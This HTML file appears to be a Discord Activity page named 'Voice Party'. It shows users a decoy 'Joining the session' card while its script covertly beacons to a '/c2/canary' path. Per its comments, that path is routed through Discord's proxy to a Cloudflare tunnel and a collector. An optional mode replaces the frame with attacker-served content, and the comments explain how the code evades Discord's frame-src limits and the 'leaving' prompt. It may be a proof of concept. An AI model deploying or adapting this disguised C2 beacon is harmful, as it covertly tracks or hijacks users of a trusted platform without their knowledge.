<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Voice Party</title>
<style>
 html,body{margin:0;height:100%}
 body{background:#0b0c0e;color:#e6e6e6;font:15px/1.56 system-ui,-apple-system,"Segoe UI",sans-serif;
      display:grid;place-items:center}
 .card{width:min(460px,88vw);padding:28px 22px;border-radius:16px;background:#16181d;
       border:1px solid #23252b;text-align:center}
 h1{margin:0 0 6px;font-size:21px}p{margin:0;color:#9aa0a6;font-size:14px}
</style></head>
<body>
<div class="card"><h1>Voice Party</h1><p id="s">Joining the session&hellip;</p></div>
<script>
// ===========================================================================
// Voice Party — Activity payload
//
// HARD CONSTRAINT (measured live, from the client's own frame-src):
//   the Activity frame may only navigate to https://*.discordsays.com,
//   https://localhost:* , or specific embed hosts. Any other host is blocked
//   -> "Framing ... violates frame-src" -> chrome-error -> white screen.
//   So this file NEVER names the tunnel. It only uses paths on our own origin,
//   which the Discord proxy rewrites through URL mappings.
//
// VERIFIED 2026-10-22 against the real proxy:
//   GET <appid>.discordsays.com/c2/canary?id=X -> tunnel -> collector, 200
//   (mapping: prefix /c2 -> target trans-perfectly-pushing-headers.trycloudflare.com)
//
// MODES
//   beacon   (default) fetch + Image to /c2/... : page keeps running, activity
//            UI untouched, request still reaches the collector.
//   takeover (TAKEOVER = true) location.replace('/c2/...') : frame renders the
//            server's page instead. Same-origin, so frame-src is satisfied.
//
// Neither mode opens a popup, calls the SDK, or touches an external host, so
// there is no Discord "leaving" dialog and no browser prompt.
// ===========================================================================
var TAKEOVER = false;                      // flip to true for frame replacement
var n = Math.random().toString(36).slice(2, 8) + '-' + Date.now().toString(36);
var BEACON   = '/c2/canary?id=' + encodeURIComponent(n + '-beacon');
var TAKEOVER_URL = '/c2/canary?id=' + encodeURIComponent(n + '-takeover');

function deliver(url) {
  try { fetch(url, {mode: 'no-cors', cache: 'no-store', keepalive: true}); } catch (e) {}
  try { var i = new Image(); i.referrerPolicy = 'no-referrer'; i.src = url; } catch (e) {}
}

if (TAKEOVER) {
  setTimeout(function () { try { location.replace(TAKEOVER_URL); } catch (e) {} }, 200);
} else {
  deliver(BEACON);
  // Re-fire once in case the first request races the proxy ticket.
  setTimeout(function () { deliver(BEACON + '&r=2'); }, 1500);
  setTimeout(function () {
    var s = document.getElementById('s');
    if (s) s.textContent = 'Waiting for participants\u2026';
  }, 2500);
}
</script>
</body></html>
